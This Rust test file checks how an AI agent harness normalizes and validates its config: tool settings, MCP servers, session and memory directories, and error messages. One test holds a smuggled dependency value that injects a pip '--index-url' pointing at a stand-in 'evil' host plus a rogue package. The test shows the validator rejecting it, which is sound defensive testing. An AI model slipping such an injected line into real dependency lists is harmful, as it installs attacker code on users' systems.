//! Ported from `harness-ts/test/config.test.ts`.
//!
//! Rust cannot load module references, so the cases that load one assert the unsupported error
//! instead, and the three cases about Node package resolution have no Rust form.

use std::path::Path;
use std::sync::Arc;

use serde_json::json;
use strands::agent::ModelSource;
use strands::experimental::context_manager::{ContextManagerPreset, ContextManagerStrategy};
use strands::types::json::JsonValue;
use strands::vended_plugins::SkillSource;

use super::options::options_from_config;
use super::*;
use crate::agent::{
    BuiltinToolsOption, CachingOption, HarnessAgentOptions, McpServersOption, MemoryOption, SessionOption,
    SkillsOption,
};
use crate::env::EnvLookup;
use crate::error::HarnessError;
use crate::interventions::{InterventionValue, InterventionsOption};
use crate::test_support::WarnRecorder;
use crate::types::WebFetchTransport;

fn define(config: JsonValue) -> HarnessAgentConfig {
    define_harness_agent_config(&config).expect("valid config")
}

fn error_of(config: JsonValue) -> String {
    normalize_harness_agent_config(&config)
        .expect_err("invalid config")
        .to_string()
}

fn env(vars: &'static [(&'static str, &'static str)]) -> EnvLookup {
    Arc::new(|name| {
        vars.iter()
            .find(|(key, _)| *key == name)
            .map(|(_, value)| (*value).to_owned())
    })
}

fn options(config: &HarnessAgentConfig, base_dir: &str) -> HarnessAgentOptions {
    options_from_config(config, Path::new(base_dir), &env(&[("HOME", "/home/user")])).expect("options")
}

fn session_dir(options: &HarnessAgentOptions) -> (Option<&str>, Option<&str>) {
    let SessionOption::Config(session) = &options.session else {
        panic!("session is {:?}", options.session);
    };
    (session.id.as_deref(), session.dir.as_deref())
}

fn memory_dir(options: &HarnessAgentOptions) -> Option<&str> {
    let MemoryOption::Config(memory) = &options.memory else {
        panic!("memory is {:?}", options.memory);
    };
    assert!(memory.stores.is_none());
    memory.dir.as_deref()
}

fn intervention_texts(options: &HarnessAgentOptions) -> Vec<&str> {
    let values = match &options.interventions {
        None => return Vec::new(),
        Some(InterventionsOption::One(value)) => std::slice::from_ref(value),
        Some(InterventionsOption::Many(values)) => values.as_slice(),
    };
    values
        .iter()
        .map(|value| match value {
            InterventionValue::Text(text) => text.as_str(),
            InterventionValue::Handler(_) => panic!("a handler from a portable config"),
        })
        .collect()
}

fn mcp_servers(options: &HarnessAgentOptions) -> JsonValue {
    match &options.mcp_servers {
        Some(McpServersOption::Servers(servers)) => JsonValue::Object(servers.clone()),
        other => panic!("mcp_servers is {other:?}"),
    }
}

#[test]
fn normalizes_the_complete_portable_definition() {
    let config = define(json!({
        "name": "Reviewer",
        "description": "Reviews changes",
        "instructions": "Be strict.",
        "effort": "high",
        "builtinTools": { "*": false, "read": true, "web_fetch": { "model": "openai/gpt-5-mini" } },
        "caching": false,
        "contextManager": "agentic",
        "session": { "id": "review" },
        "skills": false,
        "memory": false,
        "interventions": "ask",
        "modelModule": { "kind": "model", "module": "custom-model", "export": "model" },
        "interventionModules": [{ "kind": "intervention", "module": "custom-policy", "export": "policy" }],
        "agentConfigModules": {
            "conversationManager": {
                "kind": "agent-config",
                "module": "conversation-manager",
                "export": "conversationManager",
            },
        },
        "dependencies": { "typescript": { "package": "^1.0.0" }, "python": ["package>=1"] },
        "agentConfig": { "maxParallelTools": 2 },
    }));

    let json = serde_json::to_value(&config).unwrap();
    assert_eq!(normalize_harness_agent_config(&json).unwrap(), config);
    assert_eq!(
        serde_json::from_value::<HarnessAgentConfig>(json.clone()).unwrap(),
        config
    );
    assert_eq!(
        json["builtinTools"],
        json!({ "*": false, "read": true, "web_fetch": { "model": "openai/gpt-5-mini" } })
    );
    assert_eq!(json["session"], json!({ "id": "review" }));
    assert_eq!(json["memory"], json!(false));
    assert_eq!(
        json["modelModule"],
        json!({ "kind": "model", "module": "custom-model", "export": "model" })
    );
    assert_eq!(json["agentConfig"], json!({ "maxParallelTools": 2 }));
    assert_eq!(config.effort, Effort::High);
    assert_eq!(config.context_manager, HarnessConfigContextManager::Agentic);
}

#[test]
fn maps_defaults_through_the_same_contract_create_harness_consumes() {
    let options = options(&DEFAULT_HARNESS_AGENT_CONFIG, "/project");

    assert_eq!(options.agent_config.name.as_deref(), Some("Strands harness"));
    assert!(matches!(&options.model, Some(ModelSource::Id(id)) if *id == DEFAULT_HARNESS_AGENT_CONFIG.model));
    assert_eq!(options.effort, Effort::Auto);
    assert!(matches!(
        options.context_manager,
        Some(ContextManagerStrategy::Preset(ContextManagerPreset::Auto))
    ));
    assert_eq!(memory_dir(&options), Some("/project/.agent/memory"));
    assert_eq!(session_dir(&options), (None, Some("/project/.agent/sessions")));
    assert!(matches!(options.skills, SkillsOption::On));
    assert!(options.builtin_tools.is_none());
    assert_eq!(options.caching, CachingOption::Auto);
    assert!(options.builtin_plugins.is_none());
    assert!(options.mcp_servers.is_none());
    assert!(options.agent_config.description.is_none());

    // The base directory defaults to the current directory, as TS `process.cwd()`.
    let cwd = std::env::current_dir().unwrap();
    let options = harness_agent_options_from_config(&DEFAULT_HARNESS_AGENT_CONFIG, None).unwrap();
    let expected = cwd.join(".agent/sessions");
    assert_eq!(session_dir(&options).1, expected.to_str());
}

#[test]
fn forwards_a_disabled_session_as_off() {
    let config = define(json!({ "session": false }));
    assert!(matches!(options(&config, "/project").session, SessionOption::Off));
}

#[test]
fn folds_context_manager_off_to_false_matching_python() {
    for value in [json!("off"), json!(false)] {
        let config = define(json!({ "contextManager": value }));
        assert_eq!(config.context_manager, HarnessConfigContextManager::Off);
        assert_eq!(
            serde_json::to_value(&config).unwrap()["contextManager"],
            json!(false)
        );
        assert!(matches!(
            options(&config, "/project").context_manager,
            Some(ContextManagerStrategy::Off)
        ));
    }
}

// Rust form of the TS case: no referenced language can be loaded, and the error names it.
#[test]
fn fails_loudly_when_the_runtime_cannot_load_a_referenced_language() {
    let config = define(json!({
        "tools": [{ "kind": "tool", "module": "./tool.py", "language": "python", "files": ["./tool.py"] }],
    }));

    let error = options_from_config(&config, Path::new("/project"), &env(&[])).unwrap_err();
    assert!(matches!(
        error,
        HarnessError::ModuleReferenceUnsupported {
            language: Some(HarnessModuleLanguage::Python)
        }
    ));
    assert_eq!(
        error.to_string(),
        "module references are not supported in Rust yet (language \"python\")"
    );
}

// Rust form of the TS case: the declared references normalize, and loading them is the
// unsupported error wherever the reference sits.
#[test]
fn loads_executable_values_through_declared_module_references() {
    let reference = |kind: &str| json!({ "kind": kind, "module": "./values.ts", "export": "value", "language": "typescript" });
    let configs = [
        json!({ "tools": [reference("tool")] }),
        json!({ "subagents": [reference("subagent")] }),
        json!({ "plugins": [reference("plugin")] }),
        json!({ "sandbox": reference("sandbox") }),
        json!({ "memoryStores": [reference("memory-store")] }),
        json!({ "modelModule": reference("model") }),
        json!({ "builtinTools": { "web_fetch": { "model": reference("model") } } }),
        json!({ "interventionModules": [reference("intervention")] }),
        json!({ "agentConfigModules": { "conversationManager": reference("agent-config") } }),
    ];
    for config in configs {
        let error = options_from_config(&define(config), Path::new("/project"), &env(&[])).unwrap_err();
        assert_eq!(
            error.to_string(),
            "module references are not supported in Rust yet (language \"typescript\")"
        );
    }

    let config = define(json!({ "tools": [{ "module": "./tool.ts" }] }));
    let error = options_from_config(&config, Path::new("/project"), &env(&[])).unwrap_err();
    assert_eq!(
        error.to_string(),
        "module references are not supported in Rust yet"
    );

    let config = define(json!({ "interventions": ["ask", "./policy.cedar"] }));
    assert_eq!(
        intervention_texts(&options(&config, "/project")),
        ["ask", "/project/policy.cedar"]
    );
    assert!(matches!(
        options(&config, "/project").interventions,
        Some(InterventionsOption::Many(_))
    ));
}

#[test]
fn resolves_the_intervention_against_the_project_root_when_it_is_a_cedar_file() {
    let rows = [
        ("./policy.cedar", "/project/policy.cedar"),
        ("policies/policy.cedar", "/project/policies/policy.cedar"),
        ("  ./policy.cedar  ", "/project/policy.cedar"),
        ("/policies/policy.cedar", "/policies/policy.cedar"),
        ("~/policy.cedar", "/home/user/policy.cedar"),
        ("ask", "ask"),
        (
            "  Require approval for writes.  ",
            "  Require approval for writes.  ",
        ),
        ("./policy.cedar.bak", "./policy.cedar.bak"),
    ];
    for (value, expected) in rows {
        let config = define(json!({ "interventions": value }));

        let options = options(&config, "/project");

        assert!(matches!(options.interventions, Some(InterventionsOption::One(_))));
        assert_eq!(intervention_texts(&options), [expected]);
        assert_eq!(
            config.interventions,
            Some(HarnessConfigInterventions::One(value.to_owned()))
        );
    }
}

#[test]
fn expands_mcp_environment_placeholders_and_unwraps_the_server_map() {
    let config = define(json!({
        "mcpServers": {
            "mcpServers": {
                "private": {
                    "url": "https://example.com/mcp",
                    "headers": { "Authorization": "Bearer ${env:STRANDS_TEST_MCP_TOKEN}" },
                },
            },
        },
    }));

    let options = options_from_config(
        &config,
        Path::new("/project"),
        &env(&[("STRANDS_TEST_MCP_TOKEN", "secret")]),
    )
    .unwrap();

    assert_eq!(
        mcp_servers(&options),
        json!({ "private": { "url": "https://example.com/mcp", "headers": { "Authorization": "Bearer secret" } } })
    );
}

#[test]
fn rejects_a_missing_mcp_environment_variable_instead_of_passing_the_placeholder_through() {
    let config = define(json!({
        "mcpServers": { "private": { "url": "https://example.com/mcp", "headers": { "Authorization": "Bearer ${MISSING_VAR}" } } },
    }));

    let error = options_from_config(&config, Path::new("/project"), &env(&[])).unwrap_err();
    assert_eq!(
        error.to_string(),
        "Environment variable \"MISSING_VAR\" is not set."
    );
}

#[test]
fn loads_and_expands_file_backed_mcp_config() {
    let root = tempfile::tempdir().unwrap();
    std::fs::write(
        root.path().join("mcp.json"),
        json!({
            "mcpServers": {
                "private": { "url": "https://example.com/mcp", "headers": { "Authorization": "Bearer ${STRANDS_TEST_MCP_TOKEN}" } },
            },
        })
        .to_string(),
    )
    .unwrap();
    let config = define(json!({ "mcpServers": "./mcp.json" }));

    let options = options_from_config(
        &config,
        root.path(),
        &env(&[("STRANDS_TEST_MCP_TOKEN", "secret")]),
    )
    .unwrap();

    assert_eq!(
        mcp_servers(&options),
        json!({ "private": { "url": "https://example.com/mcp", "headers": { "Authorization": "Bearer secret" } } })
    );
}

#[test]
fn rejects_python_dependency_entries_carrying_extra_pip_directives() {
    let error = error_of(
        json!({ "dependencies": { "python": ["requests\n--index-url http://evil/simple\nevilpkg"] } }),
    );
    assert!(
        error.contains("dependencies.python entries must not contain line breaks."),
        "{error}"
    );
}

#[test]
fn resolves_state_directories_against_the_project_root_matching_python() {
    let config = define(json!({
        "session": { "id": "proj", "dir": ".agent/sessions" },
        "memory": { "dir": ".agent/memory" },
        "skills": [".agent/skills", "https://example.com/SKILL.md"],
    }));

    let options = options(&config, "/project");

    assert_eq!(
        session_dir(&options),
        (Some("proj"), Some("/project/.agent/sessions"))
    );
    assert_eq!(memory_dir(&options), Some("/project/.agent/memory"));
    let SkillsOption::Sources(sources) = &options.skills else {
        panic!("skills is {:?}", options.skills);
    };
    assert_eq!(
        sources,
        &[
            SkillSource::Path("/project/.agent/skills".to_owned()),
            SkillSource::Path("https://example.com/SKILL.md".to_owned()),
        ]
    );
}

#[test]
fn treats_the_retired_key_as_a_plain_unknown_key() {
    let keys = [
        "thinking",
        "webFetchModel",
        "webFetchModelModule",
        "contextManagement",
        "sessionId",
        "sessionDir",
        "skillsDir",
        "memoryDir",
        "memoryManager",
    ];
    for key in keys {
        let (config, warnings) =
            WarnRecorder::capture(|| normalize_harness_agent_config(&json!({ key: "x" })).unwrap());

        assert_eq!(warnings, [format!("Ignoring unknown agent config keys: {key}.")]);
        assert!(serde_json::to_value(&config).unwrap().get(key).is_none());
        assert_eq!(config, normalize_harness_agent_config(&json!({})).unwrap());
    }
}

#[test]
fn passes_web_fetch_transport_through_the_config_bridge() {
    let config = define(json!({ "builtinTools": { "web_fetch": { "transport": "direct" } } }));
    assert_eq!(
        serde_json::to_value(&config.builtin_tools).unwrap(),
        json!({ "web_fetch": { "transport": "direct" } })
    );
    let options = options(&config, "/project");
    let Some(BuiltinToolsOption::Config(tools)) = &options.builtin_tools else {
        panic!("builtin_tools is {:?}", options.builtin_tools);
    };
    let web_fetch = tools.web_fetch.as_ref().and_then(Setting::config).unwrap();
    assert_eq!(web_fetch.transport, Some(WebFetchTransport::Direct));
    assert!(web_fetch.model.is_none());
    assert!(tools.all.is_none() && tools.shell.is_none() && tools.subagent.is_none());
}

#[test]
fn normalizes_a_builtin_tools_mapping_with_a_per_tool_web_fetch_config() {
    let builtin_tools = json!({ "*": false, "shell": true, "web_fetch": { "model": "openai/gpt-5-mini" } });
    let config = define(json!({ "builtinTools": builtin_tools }));
    assert_eq!(
        serde_json::to_value(&config.builtin_tools).unwrap(),
        builtin_tools
    );
}

#[test]
fn normalizes_the_shell_programmatic_tool_caller_and_subagent_per_tool_configs() {
    let builtin_tools = json!({
        "shell": { "description": "Run a command." },
        "programmatic_tool_caller": { "allowedTools": ["read"], "timeout": 60 },
        "subagent": { "maxDepth": 1 },
    });
    let config = define(json!({ "builtinTools": builtin_tools }));
    let HarnessConfigBuiltinToolsSetting::Mapping(mapping) = &config.builtin_tools else {
        panic!("builtinTools is {:?}", config.builtin_tools);
    };
    assert_eq!(
        mapping.shell,
        Some(Setting::Config(ShellConfig {
            description: Some("Run a command.".to_owned())
        }))
    );
    assert_eq!(
        mapping.programmatic_tool_caller,
        Some(Setting::Config(ProgrammaticToolCallerConfig {
            allowed_tools: Some(Some(vec!["read".to_owned()])),
            timeout: Some(Some(60.0)),
        }))
    );
    assert_eq!(
        mapping.subagent,
        Some(Setting::Config(SubagentConfig { max_depth: Some(1) }))
    );

    let builtin_tools = json!({ "programmatic_tool_caller": { "allowedTools": null, "timeout": null } });
    let config = define(json!({ "builtinTools": builtin_tools }));
    assert_eq!(
        serde_json::to_value(&config.builtin_tools).unwrap(),
        builtin_tools
    );
    assert_eq!(
        serde_json::from_value::<ProgrammaticToolCallerConfig>(
            builtin_tools["programmatic_tool_caller"].clone()
        )
        .unwrap(),
        ProgrammaticToolCallerConfig {
            allowed_tools: Some(None),
            timeout: Some(None)
        }
    );
}

#[test]
fn rejects_the_per_tool_config() {
    let rows = [
        (
            json!({ "shell": { "model": "x" } }),
            "builtinTools.shell has unknown keys: model. Allowed: description.",
        ),
        (
            json!({ "shell": { "description": "" } }),
            "builtinTools.shell.description must be a non-empty string.",
        ),
        (
            json!({ "web_fetch": { "model": "" } }),
            "builtinTools.web_fetch.model must be a non-empty string.",
        ),
        (
            json!({ "web_fetch": { "transport": "wget" } }),
            "builtinTools.web_fetch.transport must be 'curl' or 'direct'.",
        ),
        (
            json!({ "web_search": { "fallback": "exa" } }),
            "builtinTools.web_search must be a boolean or 'exa'.",
        ),
        (
            json!({ "web_search": "bing" }),
            "builtinTools.web_search must be a boolean or 'exa'.",
        ),
        (
            json!({ "programmatic_tool_caller": { "allowedTools": "read" } }),
            "builtinTools.programmatic_tool_caller.allowedTools must be an array of non-empty strings or null.",
        ),
        (
            json!({ "programmatic_tool_caller": { "timeout": 0 } }),
            "builtinTools.programmatic_tool_caller.timeout must be a positive number or null.",
        ),
        (
            json!({ "subagent": { "maxDepth": 1.5 } }),
            "builtinTools.subagent.maxDepth must be a non-negative integer.",
        ),
        (
            json!({ "subagent": { "maxDepth": -1 } }),
            "builtinTools.subagent.maxDepth must be a non-negative integer.",
        ),
    ];
    for (builtin_tools, message) in rows {
        assert_eq!(
            error_of(json!({ "builtinTools": builtin_tools })),
            format!("Invalid agent config:\n{message}")
        );
    }
}

#[test]
fn rejects_an_unknown_built_in_tool_name_in_a_builtin_tools_mapping() {
    assert_eq!(
        error_of(json!({ "builtinTools": { "grep": true } })),
        "Invalid agent config:\nbuiltinTools has unknown keys: grep. Allowed: *, shell, read, write, edit, web_fetch, web_search, programmatic_tool_caller, subagent."
    );
}

#[test]
fn rejects_an_effort_outside_the_enum() {
    assert_eq!(
        error_of(json!({ "effort": "turbo" })),
        "Invalid agent config:\neffort must be one of: auto, off, minimal, low, medium, high, xhigh, max."
    );
}

#[test]
fn maps_a_builtin_tools_mapping_into_create_harness_options() {
    let config = define(json!({
        "builtinTools": { "subagent": { "maxDepth": 1 }, "web_fetch": { "model": "openai/gpt-5-mini" }, "shell": false },
    }));

    let options = options(&config, "/project");

    let Some(BuiltinToolsOption::Config(tools)) = &options.builtin_tools else {
        panic!("builtin_tools is {:?}", options.builtin_tools);
    };
    assert_eq!(
        tools.subagent,
        Some(Setting::Config(SubagentConfig { max_depth: Some(1) }))
    );
    assert_eq!(tools.shell, Some(Setting::Off));
    let web_fetch = tools.web_fetch.as_ref().and_then(Setting::config).unwrap();
    assert!(matches!(&web_fetch.model, Some(ModelSource::Id(id)) if id == "openai/gpt-5-mini"));
    assert!(web_fetch.transport.is_none());
}

#[test]
fn warns_about_unknown_config_keys_and_drops_them() {
    let mut input = serde_json::to_value(&*DEFAULT_HARNESS_AGENT_CONFIG).unwrap();
    input["builtinTool"] = json!(["shell"]);

    let (config, warnings) = WarnRecorder::capture(|| normalize_harness_agent_config(&input).unwrap());

    assert_eq!(config, *DEFAULT_HARNESS_AGENT_CONFIG);
    assert_eq!(warnings, ["Ignoring unknown agent config keys: builtinTool."]);
}

#[test]
fn lists_unknown_config_keys_in_sorted_order() {
    let (_, warnings) = WarnRecorder::capture(|| {
        normalize_harness_agent_config(&json!({ "zeta": 1, "alpha": 2, "mid": 3 })).unwrap()
    });

    assert_eq!(
        warnings,
        ["Ignoring unknown agent config keys: alpha, mid, zeta."]
    );
}

#[test]
fn rejects_unknown_memory_subkeys_and_names_them() {
    let mut input = serde_json::to_value(&*DEFAULT_HARNESS_AGENT_CONFIG).unwrap();
    input["memory"] = json!({ "dir": "mem", "stores": [{ "kind": "memory-store", "module": "store" }] });

    assert_eq!(
        error_of(input),
        "Invalid agent config:\nmemory has unknown keys: stores. Allowed: dir."
    );
}

// The TS case also has a non-JSON value (a `Date`) under `agentConfig`; a `serde_json` value is
// always JSON, so that line has no Rust form.
#[test]
fn reports_every_issue_on_its_own_line_under_the_json_path() {
    assert_eq!(
        error_of(json!({
            "name": "",
            "effort": "turbo",
            "tools": [{ "kind": "tool" }],
            "builtinTools": { "web_fetch": { "model": { "module": "" } } },
        })),
        [
            "Invalid agent config:",
            "name must be a non-empty string.",
            "effort must be one of: auto, off, minimal, low, medium, high, xhigh, max.",
            "tools[0].module must be a non-empty string.",
            "builtinTools.web_fetch.model.module must be a non-empty string.",
        ]
        .join("\n")
    );
}

#[test]
fn warns_when_memory_stores_are_given_while_memory_is_disabled() {
    let mut input = serde_json::to_value(&*DEFAULT_HARNESS_AGENT_CONFIG).unwrap();
    input["memory"] = json!(false);
    input["memoryStores"] = json!([{ "kind": "memory-store", "module": "store" }]);

    let (config, warnings) = WarnRecorder::capture(|| normalize_harness_agent_config(&input).unwrap());

    assert_eq!(config.memory, Setting::Off);
    assert_eq!(warnings, ["Ignoring memoryStores because memory is false."]);
}

#[test]
fn rejects_malformed_references_instead_of_dropping_them() {
    let mut input = serde_json::to_value(&*DEFAULT_HARNESS_AGENT_CONFIG).unwrap();
    input["tools"] = json!([{ "kind": "tool" }]);

    assert_eq!(
        error_of(input),
        "Invalid agent config:\ntools[0].module must be a non-empty string."
    );
}

#[test]
fn rejects() {
    let rows = [
        (
            json!({ "tools": ["./tool.ts"] }),
            "tools[0] must be a module reference of kind \"tool\".",
        ),
        (
            json!({ "sandbox": "docker" }),
            "sandbox must be a module reference of kind \"sandbox\".",
        ),
        (
            json!({ "tools": [{ "module": "./tool.ts", "files": null }] }),
            "tools[0].files must be an array of non-empty strings.",
        ),
        (
            json!({ "contextManager": null }),
            "contextManager must be one of: auto, agentic, off, false.",
        ),
        (
            json!({ "contextManager": {} }),
            "contextManager must be one of: auto, agentic, off, false.",
        ),
        (
            json!({ "session": { "id": "" } }),
            "session.id must be a non-empty string.",
        ),
        (
            json!({ "session": { "id": "   " } }),
            "session.id must be a non-empty string.",
        ),
        (
            json!({ "session": { "id": null } }),
            "session.id must be a non-empty string.",
        ),
        (
            json!({ "session": { "dir": "" } }),
            "session.dir must be a non-empty string.",
        ),
        (
            json!({ "session": { "dir": null } }),
            "session.dir must be a non-empty string.",
        ),
        (
            json!({ "memory": { "dir": "" } }),
            "memory.dir must be a non-empty string.",
        ),
        (
            json!({ "memory": { "dir": null } }),
            "memory.dir must be a non-empty string.",
        ),
        (
            json!({ "skills": null }),
            "skills must be a boolean, a path string, or an array of path strings.",
        ),
        (
            json!({ "skills": ["a", "b", "a"] }),
            "skills has duplicate entries: a.",
        ),
        (
            json!({ "dependencies": { "python": ["requests", "httpx", "requests", "httpx"] } }),
            "dependencies.python has duplicate entries: requests, httpx.",
        ),
    ];
    for (config, message) in rows {
        assert_eq!(error_of(config), format!("Invalid agent config:\n{message}"));
    }
}

#[test]
fn names_the_record_key_in() {
    let rows = [
        (
            json!({ "agentConfigModules": { "": { "module": "./hooks.ts" } } }),
            "agentConfigModules has an invalid key \"\": must be a non-empty string.",
        ),
        (
            json!({ "dependencies": { "typescript": { "": "^1.0.0" } } }),
            "dependencies.typescript has an invalid key \"\": must be a non-empty string.",
        ),
    ];
    for (config, message) in rows {
        assert_eq!(error_of(config), format!("Invalid agent config:\n{message}"));
    }
}

#[test]
fn keeps_module_reference_extras_an_empty_files_list_and_repeated_dependency_versions() {
    let config = define(json!({
        "tools": [{ "module": "./tool.ts", "files": [], "foo": 1 }],
        "dependencies": { "typescript": { "a": "^1.0.0", "b": "^1.0.0" } },
    }));
    assert_eq!(
        serde_json::to_value(&config.tools).unwrap(),
        json!([{ "kind": "tool", "module": "./tool.ts", "files": [], "foo": 1 }])
    );
    assert_eq!(
        serde_json::to_value(&config.dependencies.typescript).unwrap(),
        json!({ "a": "^1.0.0", "b": "^1.0.0" })
    );
}

// No TS case: `normalizeHarnessAgentConfig` rejects a non-object before any schema runs.
#[test]
fn rejects_a_config_that_is_not_an_object() {
    for value in [json!(null), json!([]), json!("x")] {
        assert_eq!(error_of(value), "agent config must be an object.");
    }
}

// No TS case: the union and container messages the TS table does not reach.
#[test]
fn reports_the_union_and_container_issues() {
    let rows = [
        (json!({ "name": null }), "name must be a non-empty string."),
        (json!({ "description": 1 }), "description must be a string."),
        (json!({ "caching": "yes" }), "caching must be a boolean."),
        (
            json!({ "modelModule": { "kind": "tool", "module": "m" } }),
            "modelModule.kind must be \"model\".",
        ),
        (
            json!({ "tools": {} }),
            "tools must be an array of tool module references.",
        ),
        (
            json!({ "memoryStores": 1 }),
            "memoryStores must be an array of memory-store module references.",
        ),
        (
            json!({ "tools": [{ "module": "m", "language": "ruby" }] }),
            "tools[0].language must be one of: typescript, python.",
        ),
        (
            json!({ "tools": [{ "module": "m", "files": [""] }] }),
            "tools[0].files[0] must be a non-empty string.",
        ),
        (
            json!({ "mcpServers": 1 }),
            "mcpServers must be a path string or a mapping of server name to config.",
        ),
        (
            json!({ "mcpServers": "" }),
            "mcpServers must be a non-empty string.",
        ),
        (
            json!({ "builtinTools": "shell" }),
            "builtinTools must be an array of tool names or a mapping of tool name to setting.",
        ),
        (
            json!({ "builtinTools": ["grep"] }),
            "builtinTools[0] must be one of: shell, read, write, edit, web_fetch, web_search, programmatic_tool_caller, subagent.",
        ),
        (
            json!({ "builtinTools": ["read", "read"] }),
            "builtinTools must not contain duplicates.",
        ),
        (
            json!({ "builtinTools": { "*": 1 } }),
            "builtinTools.* must be a boolean.",
        ),
        (
            json!({ "builtinTools": { "write": {} } }),
            "builtinTools.write must be a boolean.",
        ),
        (
            json!({ "builtinTools": { "shell": "on" } }),
            "builtinTools.shell must be a boolean or a config object.",
        ),
        (
            json!({ "builtinTools": { "web_fetch": { "model": 1 } } }),
            "builtinTools.web_fetch.model must be a \"provider/name\" string or a model module reference.",
        ),
        (
            json!({ "builtinTools": { "read": { "media": 1 } } }),
            "builtinTools.read.media must be a boolean.",
        ),
        (json!({ "session": 1 }), "session must be a boolean or an object."),
        (
            json!({ "session": { "path": "x" } }),
            "session has unknown keys: path. Allowed: id, dir.",
        ),
        (json!({ "memory": [] }), "memory must be a boolean or an object."),
        (json!({ "skills": "" }), "skills must be a non-empty string."),
        (
            json!({ "skills": ["a", ""] }),
            "skills[1] must be a non-empty string.",
        ),
        (
            json!({ "builtinPlugins": "todos" }),
            "builtinPlugins must be an array.",
        ),
        (
            json!({ "builtinPlugins": ["x"] }),
            "builtinPlugins[0] must be one of: todos, environment.",
        ),
        (
            json!({ "builtinPlugins": ["todos", "todos"] }),
            "builtinPlugins must not contain duplicates.",
        ),
        (
            json!({ "interventions": 1 }),
            "interventions must be a string, an array of strings, or null.",
        ),
        (
            json!({ "interventions": [""] }),
            "interventions[0] must be a non-empty string.",
        ),
        (
            json!({ "agentConfigModules": [] }),
            "agentConfigModules must be an object.",
        ),
        (json!({ "dependencies": 1 }), "dependencies must be an object."),
        (
            json!({ "dependencies": { "typescript": [] } }),
            "dependencies.typescript must map package names to version strings.",
        ),
        (
            json!({ "dependencies": { "typescript": { "a": "" } } }),
            "dependencies.typescript.a must be a non-empty string.",
        ),
        (
            json!({ "dependencies": { "python": "x" } }),
            "dependencies.python must be an array of non-empty strings.",
        ),
        (json!({ "agentConfig": [] }), "agentConfig must be an object."),
    ];
    for (config, message) in rows {
        assert_eq!(error_of(config), format!("Invalid agent config:\n{message}"));
    }
}

// No TS case: the bridge's remaining branches (a stdio server's `cwd`, `~`, pinned names,
// `agentConfig` keys) and the file-backed MCP errors.
#[test]
fn maps_the_remaining_config_values_into_options() {
    let config = define(json!({
        "description": "Reviews changes",
        "instructions": "Be strict.",
        "caching": false,
        "builtinTools": ["read", "shell"],
        "builtinPlugins": ["todos"],
        "skills": "~/skills",
        "memory": { "dir": "../memory" },
        "mcpServers": {
            "local": { "command": "server", "args": ["${ARG}", "$HOME ${1} ${env:}"] },
            "nested": { "command": "server", "cwd": "tools/./mcp" },
            "remote": { "url": "https://example.com/mcp" },
        },
        "agentConfig": {
            "name": "ignored",
            "description": "ignored",
            "id": "agent-1",
            "systemPrompt": "Be brief.",
            "appState": { "count": 1 },
            "printer": false,
            "backgroundTasks": false,
        },
    }));

    let options = options_from_config(
        &config,
        Path::new("/project"),
        &env(&[("HOME", "/home/user"), ("ARG", "--verbose")]),
    )
    .unwrap();

    assert_eq!(options.agent_config.name.as_deref(), Some("Strands harness"));
    assert_eq!(
        options.agent_config.description.as_deref(),
        Some("Reviews changes")
    );
    assert_eq!(options.agent_config.id.as_deref(), Some("agent-1"));
    assert_eq!(
        serde_json::to_value(&options.agent_config.system_prompt).unwrap(),
        json!("Be brief.")
    );
    assert_eq!(
        JsonValue::Object(options.agent_config.app_state.clone()),
        json!({ "count": 1 })
    );
    assert_eq!(options.agent_config.printer, Some(false));
    assert_eq!(options.background_tasks, Some(false.into()));
    assert_eq!(options.instructions.as_deref(), Some("Be strict."));
    assert_eq!(options.caching, CachingOption::Off);
    assert!(matches!(
        &options.builtin_tools,
        Some(BuiltinToolsOption::Names(names)) if *names == [BuiltinToolName::Read, BuiltinToolName::Shell]
    ));
    assert_eq!(options.builtin_plugins, Some(vec![BuiltinPluginName::Todos]));
    assert!(matches!(
        &options.skills,
        SkillsOption::Sources(sources) if *sources == [SkillSource::Path("/home/user/skills".to_owned())]
    ));
    assert_eq!(memory_dir(&options), Some("/memory"));
    assert_eq!(
        mcp_servers(&options),
        json!({
            "local": { "command": "server", "args": ["--verbose", "$HOME ${1} ${env:}"], "cwd": "/project" },
            "nested": { "command": "server", "cwd": "/project/tools/mcp" },
            "remote": { "url": "https://example.com/mcp" },
        })
    );
    options.check_passthrough().unwrap();
}

// No TS case: see `maps_the_remaining_config_values_into_options`.
#[test]
fn rejects_an_mcp_config_file_that_is_not_a_server_map() {
    let root = tempfile::tempdir().unwrap();
    std::fs::write(root.path().join("list.json"), "[]").unwrap();
    std::fs::write(root.path().join("nested.json"), r#"{"mcpServers": []}"#).unwrap();
    let error = |path: &str| {
        options_from_config(&define(json!({ "mcpServers": path })), root.path(), &env(&[]))
            .unwrap_err()
            .to_string()
    };

    assert_eq!(
        error("missing.json"),
        "MCP config \"missing.json\" must be valid JSON."
    );
    assert_eq!(
        error("list.json"),
        "MCP config \"list.json\" must contain a server map."
    );
    assert_eq!(error("nested.json"), "mcpServers must contain a server map.");
}

// No TS case: TS rejects the six harness-owned keys in the passthrough at the type level.
#[test]
fn rejects_a_harness_option_set_in_the_agent_config_passthrough() {
    let mut options = HarnessAgentOptions::builder()
        .model("anthropic/claude-fable-5".to_owned())
        .effort(Effort::High)
        .session(false)
        .build();
    options.check_passthrough().unwrap();

    options.agent_config.background_tasks = Some(true.into());
    let error = options.check_passthrough().unwrap_err();
    assert!(matches!(
        error,
        HarnessError::PassthroughOption {
            key: "background_tasks"
        }
    ));
    assert_eq!(
        error.to_string(),
        "agent_config.background_tasks is a harness option: set `background_tasks` on HarnessAgentOptions instead"
    );
}
